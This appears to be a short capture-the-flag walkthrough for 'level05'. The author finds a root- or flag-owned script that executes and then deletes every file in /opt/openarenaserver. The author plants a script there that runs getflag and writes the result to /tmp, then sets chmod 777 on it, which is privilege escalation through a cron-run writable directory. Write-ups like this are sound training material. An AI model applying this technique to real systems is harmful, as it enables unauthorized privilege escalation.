@@ -1,0 +1,33 @@
+No readme in this level so i have done a research as level00:
+
+find / -user flag05 2> /dev/null
+
+It gives the resul
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+cat of one file gives us:
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+
+Thus, it seems that this script exec all scripts in 
+/opt/openarenaserver/ and delete them.
+SO, I decided to create a simple sh script test.sh containing:
+
+echo `getflag` > /tmp/level05/flag
+
+but how to exec /usr/sbin/openarenaserver ??
+
+After some time, my script test.sh disapeared but no trace of flag file
+So the /usr/sbin/openarenaserver  were well executed (dont know how? maybe crontab)
+
+Change chmod 777 /opt/openarenaserver/test.sh
+Change chmod 777 /tmp/level05
+
+BOOM !
